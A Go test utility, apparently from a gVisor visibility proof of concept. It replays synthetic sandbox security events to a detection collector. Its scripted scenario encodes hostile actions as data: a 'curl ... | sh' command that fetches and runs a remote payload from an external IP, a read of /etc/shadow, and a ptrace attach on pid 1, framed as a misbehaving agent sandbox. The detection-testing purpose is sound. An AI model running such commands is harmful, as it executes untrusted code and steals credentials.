// Command fakesentry replays a realistic gVisor seccheck point stream over the
// remote-sink protocol, so the collector can be exercised end-to-end WITHOUT a
// cluster, without Docker, and without runsc.
//
// It is a faithful stand-in for the Sentry side of gVisor's remote sink: it
// connects to the collector's SOCK_SEQPACKET socket, performs the same handshake
// gVisor's remote.go performs (client writes Handshake first, then reads the
// server's), and then writes a sequence of [8-byte header][protobuf payload]
// datagrams using gVisor's real point schemas (the vendored .proto, compiled
// into internal/pb). The bytes on the wire are what a real Sentry emits on a
// little-endian host.
//
// The scripted scenario models one agent-sandbox "actor" session that does
// something a runtime-detection engine should care about: it starts, forks,
// execs a shell, opens a socket and connects out to an external address
// (egress), reads a sensitive file, attempts ptrace, then exits. Every one of
// those signals is invisible to a host-kernel eBPF tracer because it happens
// inside the gVisor sandbox — which is exactly the Part B visibility gap.
//
// For a real end-to-end run against gVisor instead of this replayer, see
// scripts/run-with-runsc.sh.
package main

import (
	"flag"
	"fmt"
	"os"
	"syscall"
	"time"

	"google.golang.org/protobuf/proto"

	pb "github.com/yashgupta/gvisor-visibility-poc/internal/pb"
	"github.com/yashgupta/gvisor-visibility-poc/internal/wire"
)

const (
	containerID = "agent-sandbox-actor-7f3a2b19"
	sandboxPID  = 42
	sandboxTGID = 42
)

func main() {
	endpoint := flag.String("endpoint", "/tmp/gvisor_events.sock", "collector UDS path to connect to")
	flag.Parse()

	fd, err := syscall.Socket(syscall.AF_UNIX, syscall.SOCK_SEQPACKET, 0)
	if err != nil {
		fatal("socket: %v", err)
	}
	defer syscall.Close(fd)
	if err := syscall.Connect(fd, &syscall.SockaddrUnix{Name: *endpoint}); err != nil {
		fatal("connect(%q): %v (is the collector running?)", *endpoint, err)
	}

	// ---- Handshake: client writes first, then reads server's reply. ----
	hsOut, _ := proto.Marshal(&pb.Handshake{Version: wire.CurrentVersion})
	if _, err := syscall.Write(fd, hsOut); err != nil {
		fatal("handshake write: %v", err)
	}
	in := make([]byte, 1024)
	n, err := syscall.Read(fd, in)
	if err != nil {
		fatal("handshake read: %v", err)
	}
	var hsIn pb.Handshake
	if err := proto.Unmarshal(in[:n], &hsIn); err != nil {
		fatal("handshake decode: %v", err)
	}
	fmt.Fprintf(os.Stderr, "fakesentry: connected, server version=%d\n", hsIn.GetVersion())

	for i, p := range scenario() {
		if err := send(fd, p.msgType, p.msg); err != nil {
			fatal("send point %d: %v", i, err)
		}
		time.Sleep(2 * time.Millisecond) // keep ordering readable in the demo
	}
	fmt.Fprintf(os.Stderr, "fakesentry: sent %d points, closing.\n", len(scenario()))
}

type point struct {
	msgType pb.MessageType
	msg     proto.Message
}

func ctx(name string) *pb.ContextData {
	return &pb.ContextData{
		TimeNs:          time.Now().UnixNano(),
		ThreadId:        sandboxPID,
		ThreadGroupId:   sandboxTGID,
		ContainerId:     containerID,
		ProcessName:     name,
		Cwd:             "/workspace",
	}
}

// scenario is the scripted actor session. Each entry is a real gVisor point.
func scenario() []point {
	return []point{
		{pb.MessageType_MESSAGE_CONTAINER_START, &pb.Start{
			ContextData: ctx("runsc"),
			Id:          containerID,
			Cwd:         "/workspace",
			Args:        []string{"/usr/bin/python3", "-m", "agent.main"},
		}},
		{pb.MessageType_MESSAGE_SENTRY_CLONE, &pb.CloneInfo{
			ContextData:          ctx("python3"),
			CreatedThreadId:      57,
			CreatedThreadGroupId: 57,
		}},
		{pb.MessageType_MESSAGE_SYSCALL_EXECVE, &pb.Execve{
			ContextData: ctx("python3"),
			Sysno:       59,
			Pathname:    "/bin/sh",
			Argv:        []string{"sh", "-c", "curl -s http://203.0.113.7/payload | sh"},
			Envv:        []string{"PATH=/usr/bin", "AGENT_SESSION=7f3a2b19"},
			Exit:        &pb.Exit{Result: 0},
		}},
		{pb.MessageType_MESSAGE_SYSCALL_SOCKET, &pb.Socket{
			ContextData: ctx("sh"),
			Sysno:       41,
			Domain:      2, // AF_INET
			Type:        1, // SOCK_STREAM
			Protocol:    0,
			Exit:        &pb.Exit{Result: 3},
		}},
		{pb.MessageType_MESSAGE_SYSCALL_CONNECT, &pb.Connect{
			ContextData: ctx("curl"),
			Sysno:       42,
			Fd:          3,
			Address:     sockaddrIn4("203.0.113.7", 80), // egress to an external host
			Exit:        &pb.Exit{Result: 0},
		}},
		{pb.MessageType_MESSAGE_SYSCALL_OPEN, &pb.Open{
			ContextData: ctx("sh"),
			Sysno:       257,
			Fd:          4,
			Pathname:    "/etc/shadow", // sensitive-file read from inside the sandbox
			FdPath:      "/etc/shadow",
			Flags:       0,
			Exit:        &pb.Exit{Result: 4},
		}},
		{pb.MessageType_MESSAGE_SYSCALL_PTRACE, &pb.Ptrace{
			ContextData: ctx("sh"),
			Sysno:       101,
			Request:     16, // PTRACE_ATTACH — escape/anti-analysis attempt
			Pid:         1,
			Exit:        &pb.Exit{Result: -1, Errorno: 1},
		}},
		{pb.MessageType_MESSAGE_SENTRY_TASK_EXIT, &pb.TaskExit{
			ContextData: ctx("python3"),
			ExitStatus:  0,
		}},
	}
}

// send frames one point exactly as gVisor's remote sink does: header then payload.
func send(fd int, t pb.MessageType, m proto.Message) error {
	payload, err := proto.Marshal(m)
	if err != nil {
		return err
	}
	hdr := wire.Header{
		HeaderSize:   wire.HeaderStructSize,
		MessageType:  uint16(t),
		DroppedCount: 0,
	}
	// One SEQPACKET datagram = header || payload (gVisor uses writev of the two).
	msg := append(hdr.Marshal(), payload...)
	_, err = syscall.Write(fd, msg)
	return err
}

// sockaddrIn4 builds a raw sockaddr_in: family (host-endian) + port (BE) + IPv4.
func sockaddrIn4(ip string, port uint16) []byte {
	b := make([]byte, 16)
	b[0] = 2 // AF_INET, little-endian low byte
	b[1] = 0
	b[2] = byte(port >> 8) // port, network byte order
	b[3] = byte(port)
	var o0, o1, o2, o3 int
	fmt.Sscanf(ip, "%d.%d.%d.%d", &o0, &o1, &o2, &o3)
	b[4], b[5], b[6], b[7] = byte(o0), byte(o1), byte(o2), byte(o3)
	return b
}

func fatal(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "fakesentry: "+format+"\n", args...)
	os.Exit(1)
}
